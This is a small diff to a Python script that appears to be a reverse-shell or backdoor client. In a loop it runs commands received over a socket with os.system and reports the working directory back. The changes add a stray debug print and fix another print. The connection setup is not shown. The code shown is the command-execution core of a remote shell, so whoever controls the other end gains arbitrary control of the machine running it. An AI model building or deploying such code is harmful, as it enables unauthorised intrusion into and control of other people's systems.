@@ -107,13 +107,14 @@ while True:
         break
      else:
          os.system(orden)
+         print("adsd")
          time.sleep(10)
 
 
 
      time.sleep(0.5)
      ruta=os.getcwd()
-     print("ruta")
+     print(ruta)
      s.send(ruta.encode("UTF-8"))
     except (BrokenPipeError,FileNotFoundError ):
        s.close()
